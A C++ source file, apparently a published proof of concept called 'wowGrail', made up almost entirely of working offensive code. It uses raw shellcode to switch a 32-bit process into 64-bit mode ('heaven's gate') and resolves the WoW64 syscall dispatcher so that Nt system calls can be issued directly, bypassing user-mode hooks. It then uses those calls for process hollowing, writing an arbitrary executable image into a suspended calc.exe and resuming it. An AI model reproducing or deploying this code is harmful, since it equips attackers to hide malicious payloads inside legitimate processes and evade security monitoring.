// wowGrail: Rebuild a Wew Path Back to The 64-bit Heaven
//   by aaaddress1@chroot.org
//
// **HIGHLY RECOMMEND** 
//   Compile It in Release mode, if you're using MSVC toolchain.
//   due to MSVC's performance instrumentation in Debug mode, there'll be an unexpected memory layout.
#include <iostream>
#include <intrin.h>
#include <Windows.h>
#include "wow64ext.h"
#pragma warning(disable:4996)
using namespace std;

auto memcpy64 = ((void(cdecl*)(ULONG64, ULONG64, ULONG64))((PCSTR)
	// enter 64 bit mode
	"\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb"
	// memcpy for 64 bit
	"\x67\x48\x8b\x7c\x24\x04\x67\x48\x8b\x74\x24\x0c\x67\x48\x8b\x4c\x24\x14\xf3\xa4"
	// exit 64 bit mode
	"\xe8\x00\x00\x00\x00\xc7\x44\x24\x04\x23\x00\x00\x00\x83\x04\x24\x0d\xcb\xc3"
	));

PEB64* getPtr_Peb64() {
	// mov eax,gs:[00000060]; ret
	return ((PEB64 * (*)()) & "\x65\xA1\x60\x00\x00\x00\xC3")();
}


string get64b_CSTR(ULONG64 ptr64bStr) {
	CHAR szBuf[MAX_PATH];
	memcpy64((ULONG64)&szBuf, ptr64bStr, sizeof(szBuf));
	return *new string(szBuf);
}

wstring get64b_WSTR(ULONG64 ptr64bStr) {
	WCHAR szBuf[MAX_PATH];
	memcpy64((ULONG64)&szBuf, ptr64bStr, sizeof(szBuf));
	return *new wstring(szBuf);
}


UINT64 getPtr_Module64(const wchar_t* szDllName) {
	PEB_LDR_DATA64 ldrNode = {};
	LDR_DATA_TABLE_ENTRY64 currNode = {};

	// fetch ldr head node
	memcpy64((ULONG64)&ldrNode, (ULONG64)getPtr_Peb64()->Ldr, sizeof(ldrNode));

	// read the first ldr node (should be the current EXE module)
	for (ULONG64 ptrCurr = ldrNode.InLoadOrderModuleList.Flink;; ptrCurr = currNode.InLoadOrderLinks.Flink) {
		memcpy64((ULONG64)&currNode, ptrCurr, sizeof(currNode));
		if (wcsstr(szDllName, get64b_WSTR(currNode.BaseDllName.Buffer).c_str()))
			return currNode.DllBase;
	}
	return 0;
}

void getPtr_Wow64SystemServiceEx(UINT64 &value) {
	auto ptr_wow64Mod = getPtr_Module64(L"wow64.dll");
	printf("[v] current wow64.dll @ %llx\n", ptr_wow64Mod);

	char exeBuf[4096];
	memcpy64((ULONG)&exeBuf, ptr_wow64Mod, sizeof(exeBuf));
	auto k = PIMAGE_NT_HEADERS64(&exeBuf[0] + PIMAGE_DOS_HEADER(exeBuf)->e_lfanew);
	auto rvaExportTable = k->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	memcpy64((ULONG)&exeBuf, ptr_wow64Mod + rvaExportTable, sizeof(exeBuf));

	auto numOfNames = PIMAGE_EXPORT_DIRECTORY(exeBuf)->NumberOfNames;
	auto arrOfNames = new UINT32[numOfNames + 1], arrOfFuncs = new UINT32[numOfNames + 1];
	auto addrOfNameOrds = new UINT16[numOfNames + 1];
	memcpy64((ULONG)arrOfNames, ptr_wow64Mod + PIMAGE_EXPORT_DIRECTORY(exeBuf)->AddressOfNames, sizeof(UINT32) * numOfNames);
	memcpy64((ULONG)addrOfNameOrds, ptr_wow64Mod + PIMAGE_EXPORT_DIRECTORY(exeBuf)->AddressOfNameOrdinals, sizeof(UINT16) * numOfNames);
	memcpy64((ULONG)arrOfFuncs, ptr_wow64Mod + PIMAGE_EXPORT_DIRECTORY(exeBuf)->AddressOfFunctions, sizeof(UINT32) * numOfNames);

	for (size_t i = 0; i < numOfNames; i++) {
		auto currApiName = get64b_CSTR(ptr_wow64Mod + arrOfNames[i]);
		printf("[v] found export API -- %s\n", currApiName.c_str());
		if (strstr("Wow64SystemServiceEx", currApiName.c_str()))
			value = ptr_wow64Mod + arrOfFuncs[addrOfNameOrds[i]];
	}

}

/* // Depressed Method
#pragma section(".text")
__declspec(allocate(".text")) char payload[] = (
	// enter 64 bit mode
	"\x6a\x33\xe8\x00\x00\x00\x00\x83\x04\x24\x05\xcb"

	// lookup wow64!Wow64SystemServiceEx (64bit DLL) by disasm the address of TurboDispatchJumpAddressEnd()
	"\x48\x31\xc9"      // xor rcx, rcx
	"\x49\x8B\x07"      // mov rax, [r15]
	"\x48\x8D\x40\x05"  // lea rax, [rax+05]
	"\x8B\x48\x02"      // mov ecx, [rax+02]
	"\x48\x8D\x40\x06"  // lea rax, [rax+06]
	"\x01\xC1"          // add ecx, eax
	"\x48\x8B\x01"      // mov rax, [rcx] 

	// save $rax value back to the $value variable
	"\x8B\x7C\x24\x04"  // mov edi, [esp+04]
	"\x48\xAB"          // stosq

	// exit 64 bit mode
	"\xe8\x00\x00\x00\x00\xc7\x44\x24\x04\x23\x00\x00\x00\x83\x04\x24\x0d\xcb\xc3"
);
auto getPtr_Wow64SystemServiceEx = (void (cdecl*)(uint64_t&))((PCSTR)(payload));*/

size_t getBytecodeOfNtAPI(const char* ntAPItoLookup) {
	static BYTE* dumpImage = 0;
	if (dumpImage == nullptr) {
		// read whole PE static binary.
		FILE* fileptr; BYTE* buffer; LONGLONG filelen;
		fileptr = fopen("C:/Windows/SysWoW64/ntdll.dll", "rb");
		fseek(fileptr, 0, SEEK_END);
		filelen = ftell(fileptr);
		rewind(fileptr);
		buffer = (BYTE*)malloc((filelen + 1) * sizeof(char));
		fread(buffer, filelen, 1, fileptr);

		// dump static PE binary into image.
		PIMAGE_NT_HEADERS ntHdr = (IMAGE_NT_HEADERS*)(buffer + ((IMAGE_DOS_HEADER*)buffer)->e_lfanew);
		dumpImage = (BYTE*)malloc(ntHdr->OptionalHeader.SizeOfImage);
		memcpy(dumpImage, buffer, ntHdr->OptionalHeader.SizeOfHeaders);
		for (size_t i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
			auto curr = PIMAGE_SECTION_HEADER(size_t(ntHdr) + sizeof(IMAGE_NT_HEADERS))[i];
			memcpy(dumpImage + curr.VirtualAddress, buffer + curr.PointerToRawData, curr.SizeOfRawData);
		}
		free(buffer);
		fclose(fileptr);
	}

	// EAT parse.
	PIMAGE_NT_HEADERS ntHdr = (IMAGE_NT_HEADERS*)(dumpImage + ((IMAGE_DOS_HEADER*)dumpImage)->e_lfanew);
	auto a = ntHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY ied = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)dumpImage + a.VirtualAddress);
	uint32_t* addrOfNames = (uint32_t*)((size_t)dumpImage + ied->AddressOfNames);
	uint16_t* addrOfNameOrds = (uint16_t*)((size_t)dumpImage + ied->AddressOfNameOrdinals);
	uint32_t* AddrOfFuncAddrs = (uint32_t*)((size_t)dumpImage + ied->AddressOfFunctions);
	if (ied->NumberOfNames == 0) return (size_t)0;
	for (DWORD i = 0; i < ied->NumberOfNames; i++)
		if (!stricmp((char*)((size_t)dumpImage + addrOfNames[i]), ntAPItoLookup))
			return ((size_t)dumpImage + AddrOfFuncAddrs[addrOfNameOrds[i]]);
	return 0;
}

#include <stdarg.h>
#include <stdio.h>
int NtAPI(const char* szNtApiToCall, ...) {

	PCHAR jit_stub;
	PCHAR apiAddr = PCHAR(getBytecodeOfNtAPI(szNtApiToCall));
	static uint64_t ptrTranslator(0);
	if (!ptrTranslator) getPtr_Wow64SystemServiceEx(ptrTranslator);

	static uint8_t stub_template[] = {
		/* +00 - mov eax, 00000000      */ 0xB8, 0x00, 0x00, 0x00, 0x00,
		/* +05 - mov edx, ds:[esp+0x4]  */ 0x8b, 0x54, 0x24, 0x04,
		/* +09 - mov    ecx,eax         */ 0x89, 0xC1,
		/* +0B - enter 64 bit mode      */ 0x6A, 0x33, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x04, 0x24, 0x05, 0xCB,
		/* +17 - xchg r14, rsp */        0x49, 0x87, 0xE6,
		/* +1A - call qword ptr [DEADBEEF] */ 0xFF, 0x14, 0x25, 0xEF, 0xBE, 0xAD, 0xDE,
		/* +21 - xchg r14, rsp */ 0x49, 0x87, 0xE6,
		/* +24 - exit 64 bit mode  */ 0xE8, 0x0, 0x0, 0, 0, 0xC7,0x44, 0x24, 4, 0x23, 0, 0, 0, 0x83, 4, 0x24, 0xD, 0xCB,
		0xc3,
	};

	jit_stub = (PCHAR)VirtualAlloc(0, sizeof(stub_template), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(jit_stub, stub_template, sizeof(stub_template));
	va_list    args;
	va_start(args, szNtApiToCall);
	*((uint32_t*)&jit_stub[0x01]) = *(uint32_t*)&apiAddr[1];
	*((uint32_t*)&jit_stub[0x1d]) = (size_t)&ptrTranslator;
	auto ret = ((NTSTATUS(__cdecl*)(...))jit_stub)(args);
	return ret;
}


int RunPortableExecutable(void* Image)
{
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024] = "C:\\Windows\\SysWOW64\\calc.exe";

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize
	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory
		
		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) 
		{
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated

			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);

				if (pImageBase == 0) {
					NtAPI("ZwTerminateProcess", PI.hProcess, 0);
					return 0;
				}

				// Write the image to the process
				NtAPI("NtWriteVirtualMemory", PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					NtAPI("NtWriteVirtualMemory", PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				NtAPI("NtWriteVirtualMemory", PI.hProcess, LPVOID(CTX->Ebx + 8), PVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				NtAPI("NtSetContextThread", PI.hThread, CTX); // Set the context

				DWORD useless;
				NtAPI("NtResumeThread", PI.hThread, &useless); //´Start the process/call main()

				return 0; // Operation was successful.
			}
		}
	}
}
#pragma warning(disable:4996)
BYTE* MapFileToMemory(const char filename[])
{
	FILE *fileptr;
	BYTE *buffer;

	fileptr = fopen(filename, "rb");  // Open the file in binary mode
	fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
	long filelen = ftell(fileptr);             // Get the current byte offset in the file
	rewind(fileptr);                      // Jump back to the beginning of the file

	buffer = (BYTE *)malloc((filelen + 1) * sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr); // Read in the entire file
	fclose(fileptr); // Close the file

	return buffer;
}

int main(void)
{
	// hey, RunPE again: github.com/Zer0Mem0ry/RunPE
	RunPortableExecutable(MapFileToMemory("C:/toolchain/picaball.exe"));
	return 0;
}